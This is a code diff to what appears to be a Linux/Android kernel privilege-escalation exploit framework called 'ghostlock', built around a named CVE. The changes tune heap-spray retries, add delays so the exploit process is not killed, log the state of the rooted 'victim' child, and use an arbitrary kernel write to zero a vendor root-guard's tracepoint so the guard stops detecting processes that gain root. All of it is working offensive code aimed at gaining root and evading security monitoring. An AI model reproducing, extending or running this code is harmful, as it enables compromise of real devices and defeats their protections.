@@ -29,13 +29,60 @@
 #include <unistd.h>
 
 #include <array>
+#include <cerrno>
 #include <cstdint>
+#include <cstdio>
+#include <cstdlib>
+#include <cstring>
 #include <optional>
 #include <string_view>
 #include <utility>
 
 namespace ghostlock::session::backend {
     namespace {
+        /* Sampling the rooted child is the only way to tell two very different
+         * failures apart: vendors with a root guard reap the child (and often
+         * its whole process group) the moment it holds euid 0, and once we are
+         * SIGKILLed nothing can be logged any more. Called right before and
+         * after each step that touches the child.
+         */
+        void log_victim_state(const char *tag, pid_t pid) {
+            if (pid <= 0) {
+                pr_warning("%s: victim pid=%d (none)\n", tag, pid);
+                return;
+            }
+            const int32_t saved_errno = errno;
+            const int32_t alive = (kill(pid, 0) == 0) ? 1 : (errno == EPERM ? 1 : 0);
+            char state = '?';
+            long long uid = -1;
+            char path[64];
+
+            snprintf(path, sizeof(path), "/proc/%d/stat", pid);
+            if (FILE *stat = fopen(path, "re")) {
+                char line[512];
+                if (fgets(line, sizeof(line), stat)) {
+                    /* "pid (comm) S ..." - comm may contain spaces and parens,
+                     * so the state is the field after the last ')'. */
+                    const char *close = strrchr(line, ')');
+                    if (close && close[1] == ' ') state = close[2];
+                }
+                fclose(stat);
+            }
+            snprintf(path, sizeof(path), "/proc/%d/status", pid);
+            if (FILE *status = fopen(path, "re")) {
+                char line[256];
+                while (fgets(line, sizeof(line), status)) {
+                    if (!strncmp(line, "Uid:", 4)) {
+                        uid = atoll(line + 4);
+                        break;
+                    }
+                }
+                fclose(status);
+            }
+            pr_info("%s: victim pid=%d alive=%d state=%c uid=%lld\n",
+                    tag, pid, alive, state, uid);
+            errno = saved_errno;
+        }
         /* Shared write/retry sequence. */
         template <class M>
         Status retry_write_stage(
@@ -71,6 +118,15 @@ namespace ghostlock::session::backend {
                 }
                 if (static_cast<memory::WriteMode>(mode) == memory::WriteMode::Credential) {
                     if (!M::w2_fast_repair_prebuild(session)) return false;
+                    /* W2D: the credential write runs two full KernelSnitch
+                     * collision scans back to back - one for the prebuild page
+                     * above and one inside attack_write below. On the
+                     * qcom/other 6.1.141 line the futex subsystem is already
+                     * saturated from W1+W1b (~128 punch+walk cycles each), and
+                     * hammering it again immediately is what gets the process
+                     * SIGKILLed externally. Settle long enough for the PI
+                     * waiters to drain before the second scan. */
+                    support::settle_w2_prebuild();
                 }
                 Status routed = Cve2026_43499Policy::template attack_write<M>(session, request, stage);
                 if (!routed) {
@@ -194,6 +250,44 @@ namespace ghostlock::session::backend {
 
                 int32_t vr_ok = 1;
                 if (vr_needed) {
+                    /* 0) Detach the sys_exit tracepoint itself — the original
+                     * fix for this guard, and the only one that also covers
+                     * processes forked AFTER this point (ksud spawns them).
+                     *
+                     * struct tracepoint { name; key; static_call_key;
+                     *   static_call_tramp; iterator; regfunc; unregfunc;
+                     *   struct tracepoint_func __rcu *funcs; }
+                     * `funcs` sits at profile vr_guard.tracepoint_funcs
+                     * (0x40 before 6.6, 0x48 after probestub was inserted),
+                     * and __DO_TRACE() bails out on a NULL funcs, so zeroing
+                     * the pointer is safe: the probe stops running instead of
+                     * the kernel faulting. vmcore/vr.ko never unregisters, so
+                     * the RCU list is not walked afterwards.
+                     * Absent offset/funcs = the profile predates the guard;
+                     * the per-task tag clear below stays the fallback. */
+                    {
+                        const profile::kernel_offsets *values = session.profile.values();
+                        const uint64_t tp_off = values ? values->offsets.vr_sys_exit_tp : 0;
+                        const uint32_t funcs_off =
+                                values && values->misc.vr_tracepoint_funcs
+                                    ? *values->misc.vr_tracepoint_funcs
+                                    : 0u;
+                        if (tp_off != 0 && funcs_off != 0) {
+                            const uintptr_t funcs_slot = session.addresses.data_alias(
+                                static_cast<uintptr_t>(kernel::KIMAGE_TEXT_BASE + tp_off +
+                                                       funcs_off));
+                            const memory::WriteRequest tp_request = memory::WriteRequest::make(
+                                funcs_slot, memory::WriteMode::Zero, 1);
+                            if (Cve2026_43499Policy::template attack_write<M>(
+                                    session, tp_request, "VR: sys_exit tp funcs")) {
+                                pr_success("vr.ko sys_exit tracepoint detached funcs@%016zx\n",
+                                           funcs_slot);
+                            } else {
+                                pr_warning("vr.ko tracepoint detach failed; per-task tags remain\n");
+                            }
+                        }
+                    }
+
                     /* 1) Clear thread_info.flags word (covers tag A + tracepoint bit) */
                     const memory::WriteRequest flags_request = memory::WriteRequest::make(
                         child_task + kernel::TASK_THREAD_INFO_FLAGS_OFF, memory::WriteMode::Zero, 1);
@@ -261,6 +355,11 @@ namespace ghostlock::session::backend {
             }
 
             constexpr bool exact_target = M::w3_exact_target;
+            /* W2 just proved euid 0 on this child. If a vendor root guard is
+             * about to reap it, both the child and our own process group go
+             * away during the next spray - record the pre-state so the log
+             * shows who died first. */
+            log_victim_state("W3 precheck", pipes.child());
             victim::w3_stage_context w3_context = {
                 .pipes = pipes,
                 .leaf_to_target8 = !exact_target,
@@ -270,6 +369,7 @@ namespace ghostlock::session::backend {
                 Status dir_ok = retry_write_stage<M>(
                     session, "W3-0: leaf dir", child_task + ghostlock::profile::task_comm_off(), 1, 4, 50000,
                     victim::verify_leaf_dir_stage, &w3_context, 1);
+                log_victim_state("W3-0 done", pipes.child());
                 if (!dir_ok) {
                     /* U01/S14: upstream retires the child instead of guessing the leaf
                  * direction and blind-writing the task neighbour. Returning false
@@ -391,8 +491,21 @@ namespace ghostlock::session::backend {
                 attack::timer_mark("pre-W1 drain");
                 uint32_t w1_attempts = g_exploit_session.profile.w1_attempts();
                 if constexpr (M::multicast) {
-                    /* a non-resident multicast write cannot safely retry a missed W1 */
+                    /* A non-resident multicast write cannot safely retry a
+                     * missed W1: the armed middleware state survives the failed
+                     * write and a second punch lands on top of it. The sigret
+                     * punch carries no such state - every attempt re-sprays and
+                     * re-raises a copy on its own thread stack - so a miss there
+                     * is just an unlucky heap draw and deserves another go. On a
+                     * long-running boot the slab layout drifts and the first
+                     * draw misses far more often, which is exactly when this
+                     * single-shot policy turned one unlucky draw into a failed
+                     * run. */
                     w1_attempts = 1;
+                    if (const char *punch = getenv("GL_PUNCH");
+                        punch && strcmp(punch, "sigret") == 0) {
+                        w1_attempts = 3;
+                    }
                 }
                 support::run_state::enter("w1a");
                 selinux_ok = retry_write_stage<M>(
